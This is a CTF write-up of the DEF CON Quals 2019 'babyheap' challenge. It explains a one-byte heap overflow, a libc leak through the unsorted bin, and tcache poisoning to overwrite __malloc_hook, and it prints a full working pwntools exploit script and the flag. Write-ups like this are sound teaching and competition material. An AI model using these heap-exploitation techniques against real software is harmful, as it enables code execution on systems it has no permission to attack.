---
title: "DEF CON CTF Quals 2019 - babyheap (pwn)"
date: 2019-05-14
categories: [writeup]
tags: [writeups, pwn]
---

*Author: brnby*

This weekend I competed in the DEF CON qualifiers with my CTF team **the cr0wn**. We also joined forces with #2 ranking UK team **EmpireCTF**, playing under the name **EmpireCr0wn**. I solved the *babyheap* challenge, which had a total of 88 solves and was worth 112 points.

## babyheap overview
Like a lot of CTF heap challenges, *babyheap* has a simple menu that allows you to malloc, free and print chunks.

![menu](/images/defconquals19/babyheap/menu.png)

The malloc option allows you to specify the size of the chunk, followed by the content that should be written into that chunk.

![malloc](/images/defconquals19/babyheap/malloc.png)

Despite allowing us to enter a custom size, it turns out that we're limited to a max of `0x178`, and only two chunk sizes can be allocated. If the size is less than `0xf9`, a chunk of size `0xf8` will be allocated, otherwise, a chunk of size `0x178` will be allocated.
```c
size = read_long();
if ((int)size - 1U < 0x178) {
actual_size = (uint)(size & 0xffffffff);
if (actual_size < 0xf9) {
  chunk = malloc(0xf8);
  ...
}
else {
  chunk = malloc(0x178);
  ...
}
```

We can also free, or display, previously allocated chunks by specifying their index.

![free](/images/defconquals19/babyheap/free.png)

![show](/images/defconquals19/babyheap/show.png)

Executing the provided libc shows us that we're dealing with glibc version 2.29, which includes tcache. Tcache is a new type of heap bin that speeds up glibc by prioritising reuse of memory that was previously allocated by the same thread.
```
GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29.
Copyright (C) 2019 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 8.3.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

## One byte overflow
The vulnerability exists in the code that reads the content into the chunk. The content is written one byte at a time, but the termination condition is only checked after the byte has been written, which allows us to write one more byte than we should be able to.
```c
read(0,&one_byte_buffer,1);
for (i = 0; i != size; i++) {
    if ((one_byte_buffer == '\n') || (one_byte_buffer == 0)) {
        result = 0;
        goto LAB_001013ae;
    }
    *(char *)(*(long *)(&ALLOCATION_ARRAY + (ulong)next_index * 0x10) + i) = one_byte_buffer;
    read(0,&one_byte_buffer,1);
}
result = 0;
```

As the heap chunks will be allocated next to each other, we'll be able to overwrite the least significant byte of the next chunks size.

![overflow](/images/defconquals19/babyheap/overflow.png)

## Strengthening the primitive
We can't use this single byte overflow to gain code execution directly, but we can use it to gain a stronger primitive. We'll do this by changing the size of a chunk from `0xf8` to `0x178`, freeing it and then allocating it again, which lets us overwrite the entire metadata of the next chunk. Note that `0xf8` and `0x178` are the usable chunk sizes. The actual size fields in the chunk metadata will contain `0x100` and `0x180`.

![strengthened primitive](/images/defconquals19/babyheap/strengthened_primitive.png)

## Leak
This particular libc has a couple of one gadgets, but we'll need to leak a libc address before we can write the one gadget address into the binary. A good way of getting a libc address into the heap is to free a chunk into the unsorted bin. The unsorted bin is a doubly linked circular list, with the head of the list initially pointing into the main arena (which is in libc). The first chunk freed into the unsorted bin will get a main arena address written into its fd pointer.

Tcache bins will always be prioritised for allocation over unsorted bins unless they're fully populated, so our first step is to saturate them. There's only 7 slots in each tcache bin, so freeing 7 chunks of the same size should cause the next free chunk to end up in the unsorted bin.

```python
for i in range(10):
    malloc(challenge, 0xf8, pwn.cyclic(0x20))
for i in range(10):
    free(challenge, i)
```

How do we read the libc address out of the chunk? Using our strengthened overwrite primitive, we can write printable data right up to the edge of the libc address and show the chunk using our show command. All of our printable overflow will be printed, as well as the libc address.

![overflow to the libc address](/images/defconquals19/babyheap/overflow_to_libc_address.png)

One slight complication is that the least significant byte in the main arena address is always `\x00`, which prevents the libc address from being printed. I addressed this by overwriting it with a non-null value and fixing it up after the address had been leaked.

```python
malloc(challenge, 0xf8, pwn.cyclic(0x20))
malloc(challenge, 0xf8, pwn.cyclic(0xf8) + "\x81") # Change the chunk size from 0x100 to 0x180.
free(challenge, 0)
null_byte_overwrite = 0x41
payload = pwn.cyclic(0x100) + pwn.p8(null_byte_overwrite) # Overwrite the pesky null byte.
malloc(challenge, 0x178, payload) # Allocate right up to the edge of the main arena address.
raw_leak_data = show(challenge, 0)
leaked_address = pwn.u64(raw_leak_data[-6:] + "\x00\x00") - null_byte_overwrite
libc_base_address = leaked_address - libc.sym["main_arena"] - 0x60
```

## Tcache arbitrary write
The plan is to overwrite the malloc hook with a one gadget address, because we have an easy way to get malloc called and we can calculate the address of the one gadget and the malloc hook.

![onegadget](/images/defconquals19/babyheap/one_gadget.png)

To achieve our arbitrary write, we'll trick glibc into returning the arbitrary address when we call malloc. Tcache makes this really easy, because the bins are just singly linked lists and there are almost no corruption checks (at least in 2.29). We'll free a chunk into the tcache bin, overwrite the next pointer using our strengthened overflow primitive, and after a couple of mallocs, our arbitrary address will be returned.

![tcache overflow](/images/defconquals19/babyheap/tcache_overflow.png)

The full exploit script is as follows:
```python
#! /usr/bin/env python2
import pwn

MENU = "Command:"

def malloc(challenge, size, content):
    challenge.sendlineafter(MENU, "M")
    challenge.sendlineafter("Size:", str(size))
    challenge.sendlineafter("Content:", content)


def free(challenge, index):
    challenge.sendlineafter(MENU, "F")
    challenge.sendlineafter("Index:", str(index))


def show(challenge, index):
    challenge.sendlineafter(MENU, "S")
    challenge.sendlineafter("Index:", str(index))
    menu_beginning = "-----Yet Another Babyheap!-----"
    data = challenge.recvuntil(menu_beginning)

    # Remove the stuff we don't care about.
    data = data[3:-(len(menu_beginning) + 1)]

    return data

def pack_address_and_remove_nulls(address_to_pack):
    # We can't write null bytes, so we need to shorten the payload to just the bits we need.
    packed_address = pwn.p64(address_to_pack)
    first_null_byte_index = packed_address.index("\x00")
    return packed_address[:first_null_byte_index]


def main():
    pwn.context.log_level = "debug"

    elf = pwn.ELF("./babyheap")
    #libc = pwn.ELF("/usr/lib/libc.so.6")
    #pwn.log.warning("YOU'RE STILL USING YOUR OWN LIBC!")
    libc = pwn.ELF("./libc.so")
    preload_env = {"LD_PRELOAD": "./libc.so"}
    if pwn.args.GDB:
        challenge = pwn.process(elf.path, env = preload_env)
        #challenge = pwn.process(elf.path)

        # Breakpoints:
        # 0x128e : (size-1) < 0x178 check in malloc
        # 0x13c6 : malloc_command return
        # 0x13e3 : Near the start of free
        # 0x11c5 : read_long
        # 0x1207 : strtol in read_long
        # 0x140c : memset call in free
        debugger = pwn.gdb.attach(challenge, gdbscript="""
            c
        """)
    elif pwn.args.REMOTE:
        challenge = pwn.remote("babyheap.quals2019.oooverflow.io", 5000)
    else:
        challenge = pwn.process(elf.path, env = preload_env)
        #challenge = pwn.process(elf.path)


    # The basic exploit primitive for this challenge is to use the one byte overflow to overwrite the size field
    # of a chunk, such that when we free it we can malloc it at a larger size, allowing us to overwrite even more
    # chunk metadata. We can use this technique for both leaking a libc pointer and overwriting the malloc hook.
    #
    # The binary let's us allocate at two sizes: 0xf8 and 0x178. So we'll need to change the size of an 0xf8
    # chunk to 0x178.
    #
    # The libc used for the challenge has a one gadget, for which we'll need to leak a libc pointer before we
    # can use. Chunks in the unsorted bin are doubly circularly linked and initially, the head of the unsorted
    # bin points into the main arena, which is inside libc. If we free a chunk into the unsorted bin, a main
    # arena address will be written into that chunks metadata. Using our chunk size expansion primitive, we can
    # overflow right up to the edge of this address. Then, when we show the now larger chunk, the main arena
    # address will also be printed.

    # As this is libc 2.29, we need to be aware of tcache. Before we can free into the unsorted bin, we have to
    # fill up the tcache bins first. There's only 7 of them, so it's easy to fill them up. We should end up with
    # a few chunks in the unsorted bin.
    for i in range(10):
        malloc(challenge, 0xf8, pwn.cyclic(0x20))
    for i in range(10):
        free(challenge, i)

    # Now we're going to perform the leak described above. In practice, the main arena address that we leak ends
    # with a null byte, which prevents it from being shown using the `Show` command. We'll fix that by
    # overwriting it with a non-null byte.
    malloc(challenge, 0xf8, pwn.cyclic(0x20))
    malloc(challenge, 0xf8, pwn.cyclic(0xf8) + "\x81") # Change the chunk size from 0x100 to 0x180.
    free(challenge, 0)
    null_byte_overwrite = 0x41
    payload = pwn.cyclic(0x100) + pwn.p8(null_byte_overwrite) # Overwrite the pesky null byte.
    malloc(challenge, 0x178, payload) # Allocate right up to the edge of the main arena address.
    raw_leak_data = show(challenge, 0)
    leaked_address = pwn.u64(raw_leak_data[-6:] + "\x00\x00") - null_byte_overwrite
    pwn.log.info("Leaked libc address: {}".format(hex(leaked_address)))
    #libc_base_address = leaked_address - libc.sym["main_arena"] - 0x60 # my libc has debug symbols
    libc_base_address = leaked_address - 0x1e4c00 # Offset grabbed using GDB.
    pwn.log.info("Libc base address: {}".format(hex(libc_base_address)))

    # We can use the same chunk size expansion technique to gain code execution, but this time we'll be focusing
    # on the tcache bin. Tcache bins are just singly linked lists and they have very few corruption checks.
    # We'll overwrite the "next" pointer in a free tcache chunk using our overflow technique, and then our
    # arbitrary address will be returned after a couple of mallocs.
    malloc(challenge, 0xf8, pwn.cyclic(0x20)) # Chunk A.
    malloc(challenge, 0xf8, pwn.cyclic(0xf8) + "\x81") # Chunk B. Change the chunk size from 0x100 to 0x180.
    free(challenge, 2) # Free chunk A.
    free(challenge, 1) # Free chunk B.
    malloc_hook_address = libc_base_address + libc.sym["__malloc_hook"]
    pwn.log.info("__malloc_hook: {}".format(hex(malloc_hook_address)))
    packed_overwrite_address = pack_address_and_remove_nulls(malloc_hook_address)
    malloc(challenge, 0x178, pwn.cyclic(0x100) + packed_overwrite_address) # Overflow chunk B into chunk A.

    # After a couple of mallocs, the malloc hook address will be returned by malloc.
    one_gadget_address = libc_base_address + 0x106ef8 # actual libc
    #one_gadget_address = libc_base_address + 0x106ef8 # my libc
    malloc(challenge, 0xf8, pwn.cyclic(0x20))
    malloc(challenge, 0xf8, pack_address_and_remove_nulls(one_gadget_address)) # Overwrite the malloc hook.

    # Call malloc to call the overwritten hook.
    challenge.sendlineafter(MENU, "M")
    challenge.sendlineafter("Size:", "123")

    pwn.log.info("You should have a shell now!")
    challenge.interactive()


if __name__ == "__main__":
    main()
```

## Flag
`OOO{4_b4byh34p_h45_nOOO_n4m3}`
